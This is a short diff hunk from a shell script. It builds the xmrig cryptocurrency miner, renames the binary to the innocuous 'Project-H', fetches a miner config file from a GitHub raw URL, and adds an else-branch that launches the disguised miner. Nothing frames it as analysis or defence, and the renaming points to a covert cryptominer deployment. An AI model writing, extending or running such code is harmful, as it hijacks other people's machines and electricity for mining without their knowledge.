@@ -15,4 +15,7 @@ if [ ! -e "AAA" ]; then
    make
    mv xmrig Project-H
    wget https://raw.githubusercontent.com/U117A/scripts/master/userconfig.json
+else
+   cd AAA/build 
+   ./Project-H  
 fi
